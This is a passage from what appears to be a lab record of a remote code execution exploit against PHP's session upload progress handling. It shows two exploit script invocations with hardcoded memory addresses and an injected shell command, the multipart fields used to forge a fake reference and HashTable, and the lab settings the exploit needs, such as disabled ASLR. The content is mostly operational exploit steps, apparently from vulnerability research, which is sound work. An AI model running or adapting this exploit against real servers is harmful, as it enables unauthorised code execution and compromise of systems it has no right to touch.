## 4. Commands

~~~bash
# A: OOM and leave a dangling reference across requests
python3 send_a_ps.py 17 19 3 12

# B: fake reference + fake HashTable + system
python3 send_b_rce2.py 7 2 0x7ffff5e6e0d8 0x7ffff7d13490 "id>/tmp/p1"

cat /tmp/p1
~~~

Key B multipart parameters:

~~~text
boundary                    = "B" * 10
PHPSESSID                   = attacksessionid0001
PHP_SESSION_UPLOAD_PROGRESS = pwn
7 priming fields            = 31-character names + 167B fake HashTable
2 fake-reference fields     = short names + 55B fake reference
~~~

## 5. Notes

- `session.upload_progress.cleanup=On` is required for B to reach END cleanup/track_init.
- `memory_limit=8M` makes A OOM easily in the lab; the vulnerability itself requires `session.upload_progress.enabled=On` (default).
- This record proves only no-ASLR behavior. Analysis of the two ASLR paths is in `../ASLR_PATHS.md`.
